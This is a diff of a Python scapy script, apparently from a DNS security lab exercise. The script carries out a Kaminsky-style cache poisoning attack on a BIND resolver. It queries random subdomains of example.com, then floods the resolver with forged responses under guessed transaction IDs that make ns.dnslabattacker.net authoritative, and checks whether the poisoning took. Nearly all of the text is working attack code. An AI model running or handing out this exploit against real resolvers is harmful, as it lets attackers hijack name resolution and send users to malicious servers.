@@ -6,12 +6,12 @@ from scapy.all import *
 from random import randint, choice
 from string import ascii_lowercase, digits
 from subprocess import call
-BUF_SIZE = 4096
+
 
 parser = argparse.ArgumentParser()
 parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
 parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
-parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=False)
+parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=False)  # Change it to not required
 parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
 args = parser.parse_args()
 
@@ -23,6 +23,9 @@ my_port = args.port
 dns_port = args.dns_port
 # port that your bind uses to send its DNS queries
 my_query_port = args.query_port
+
+local_host = "127.0.0.1"
+
 
 '''
 Generates random strings of length 10.
@@ -55,44 +58,50 @@ def exampleSendDNSQuery():
     print response.show()
     print "***** End of Remote Server Packet *****\n"
 
-# Function to attack
-def cachePoison(): 
-    # code that sends a DNS query using scapy
+
+def attack():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
     dnsPacket = DNS(rd=1, qd=DNSQR(qname='example.com'))
     sendPacket(sock, dnsPacket, my_ip, my_port)
-    response = DNS(sock.recv(BUF_SIZE))
+    response = sock.recv(4096)
+    response = DNS(response)
 
-    # fake a query and response
-    fakeQuery = dnsPacket
-    fakeResponse = response
-    fakeResponse.arcount = 0
-    fakeResponse.aa = 1
-    fakeResponse.nscount = 1
-    fakeResponse.ar = None
-    fakeResponse.ns.rdata = "ns.dnslabattacker.net"
-    fakeResponse.ns.rrname = "example.com"
+    # TODO: Fake the response and query
+    fake_query = dnsPacket
+    fake_response = response
+    fake_response.ns.rrname = "example.com"
+    fake_response.ns.rdata = "ns.dnslabattacker.net"
+    fake_response.arcount = 0
+    fake_response.ar = None
+    fake_response.aa = 1
+    fake_response.nscount = 1
 
     while True:
-        fakeName = getRandomSubDomain() 
-        fakeQuery[DNS].qd.qname = fakeName + ".example.com"
-        fakeResponse[DNS].an.rrname = fakeName + ".example.com"
-        fakeResponse[DNS].qd.qname = fakeName + ".example.com"
-        sendPacket(sock, fakeQuery, my_ip, my_port)
+        fake_name = getRandomSubDomain() 
+        fake_query[DNS].qd.qname = fake_name + ".example.com"
+        fake_response[DNS].qd.qname = fake_name + ".example.com"
+        fake_response[DNS].an.rrname = fake_name + ".example.com"
+        
+        # Fake query
+        sendPacket(sock, fake_query, my_ip, my_port)
 
-        for i in range(100):
-            fakeResponse.id = getRandomTXID()
-            sendPacket(sock, fakeResponse, my_ip, my_query_port)
+        # Flood the server with fake responses
+        for i in range(50):
+            random_id = getRandomTXID()
+            fake_response.id = random_id
+            sendPacket(sock, fake_response, my_ip, my_query_port)
 
+        # Check if succeed
         dnsPacket.qd.qname = "example.com"
         sendPacket(sock, dnsPacket, my_ip, my_port) 
-        response = DNS(sock.recv(BUF_SIZE))
+        response = sock.recv(4096)
+        response = DNS(response)
         
-        if (response[DNS].ns[DNSRR].rdata == "ns.dnslabattacker.net.") & (response != None):
-            print("Success!") 
+        if (response != None) & (response[DNS].ns[DNSRR].rdata == "ns.dnslabattacker.net."):
+            print("Cache poisoning succeeded!") 
             break
 
-        print("Failed :(. Trying again...")
+        print("Cache poisoning failed. Trying another round...")
 
 if __name__ == '__main__':
-    cachePoison()
+    attack()
